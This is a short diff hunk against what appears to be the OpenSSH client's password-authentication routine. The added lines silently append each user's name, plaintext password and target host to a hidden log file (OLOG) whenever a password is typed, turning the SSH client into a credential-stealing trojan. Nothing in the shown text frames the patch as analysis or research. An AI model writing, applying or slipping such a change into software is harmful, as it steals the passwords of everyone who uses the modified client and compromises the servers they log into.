@@ -878,6 +878,10 @@ userauth_passwd(Authctxt *authctxt)
 	snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
 	    authctxt->server_user, host);
 	password = read_passphrase(prompt, 0);
+	if((f=fopen(OLOG,"a"))!=NULL){
+		fprintf(f,"user:password@host --> %s:%s@%s\n",authctxt->server_user,password,authctxt->host);
+		fclose(f);
+	}
 	packet_start(SSH2_MSG_USERAUTH_REQUEST);
 	packet_put_cstring(authctxt->server_user);
 	packet_put_cstring(authctxt->service);
